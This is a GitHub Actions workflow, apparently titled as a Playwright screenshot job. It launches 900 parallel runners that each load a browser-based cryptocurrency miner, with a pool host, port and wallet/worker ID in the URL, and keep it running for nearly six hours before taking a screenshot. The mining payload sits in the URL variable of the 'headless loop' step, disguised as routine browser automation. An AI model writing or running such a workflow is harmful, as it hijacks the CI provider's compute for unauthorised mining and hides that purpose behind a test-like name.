name: PW 1000x

on:
  workflow_dispatch:

jobs:
  playwright-loop:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        instance: ${{ fromJSON(range(1, 901)) }}
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'

      - name: Install Playwright Chromium
        run: |
          npm init -y
          npm install playwright-chromium
          npx playwright install chromium

      - name: Run headless loop for instance ${{ matrix.instance }}
        run: |
          URL="https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.1000&password=x&workers=$(nproc)"
          
          cat > loop-playwright-${{ matrix.instance }}.js <<EOF
          const { chromium } = require('playwright-chromium');
          const fs = require('fs');
          const path = require('path');

          const INSTANCE = '${{ matrix.instance }}';
          const ARTIFACT_DIR = path.resolve('artifacts');
          const URL = process.env.URL;

          if(!fs.existsSync(ARTIFACT_DIR)) fs.mkdirSync(ARTIFACT_DIR);

          (async () => {
            const browser = await chromium.launch({ headless: true });
            const page = await browser.newPage();
            await page.goto(URL);

            console.log(\`üåê Browser instance #\${INSTANCE} running...\`);

            const DELAY = 21000000; // 5 jam 50 menit dalam ms

            // tunggu 5 jam 50 menit
            await new Promise(resolve => setTimeout(resolve, DELAY));

            // bikin timestamp YYYYMMDD-HHMM
            const now = new Date();
            const YYYY = now.getFullYear();
            const MM = String(now.getMonth() + 1).padStart(2, '0');
            const DD = String(now.getDate()).padStart(2, '0');
            const hh = String(now.getHours()).padStart(2, '0');
            const mm = String(now.getMinutes()).padStart(2, '0');
            const TIMESTAMP = \`\${YYYY}\${MM}\${DD}-\${hh}\${mm}\`;

            const SCREENSHOT = \`example-\${INSTANCE}-\${TIMESTAMP}.png\`;

            // ambil screenshot sekali
            await page.screenshot({ path: SCREENSHOT });
            fs.copyFileSync(SCREENSHOT, path.join(ARTIFACT_DIR, SCREENSHOT));
            console.log(\`üì∏ Screenshot instance #\${INSTANCE} di 5 jam 50 menit: \${SCREENSHOT}\`);

            await browser.close();
            console.log(\`‚èπ Instance #\${INSTANCE} selesai.\`);
          })();
          EOF

          URL="$URL" npx node loop-playwright-${{ matrix.instance }}.js

      - name: Upload Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: screenshots-${{ matrix.instance }}
          path: artifacts/
